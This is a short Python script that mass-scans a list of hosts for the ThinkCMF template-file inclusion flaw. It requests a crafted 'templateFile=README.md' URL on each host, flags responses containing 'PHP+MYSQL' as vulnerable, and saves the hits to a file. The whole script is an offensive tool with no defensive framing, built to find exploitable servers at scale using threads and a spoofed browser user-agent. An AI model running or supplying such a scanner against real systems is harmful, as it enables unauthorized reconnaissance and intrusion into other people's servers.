import requests,re
from threading import Thread
restart = []
def get_iplist():
	ip_list = []
	with open('thinkcmf.txt','r') as f:
		for i in f:
			if '\n' in i:
				ip_list.append(i[:-1])
			else:
				ip_list.append(i) 
	return ip_list

def check(i):
	headers = {
		'User-Agent':
		'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36'
	}
	try:
		url = fr'http://{i}/?a=display&templateFile=README.md'
		r = requests.get(url,headers = headers,timeout = 5).text
		if 'PHP+MYSQL' in r :
			print(f'{url} ---------> yes')
			restart.append(url)
		else:
			print(f'{url} ---------> no')
	except:
		pass

def save():
	with open('HaveFileContains.txt','w') as f:
		for i in restart:
			f.write(i+'\n')

if __name__ == '__main__' :
	ip_list = get_iplist()
	for i in ip_list:
		t = Thread(target = check,args = (i,))
		t.start()
	t.join()
	save()
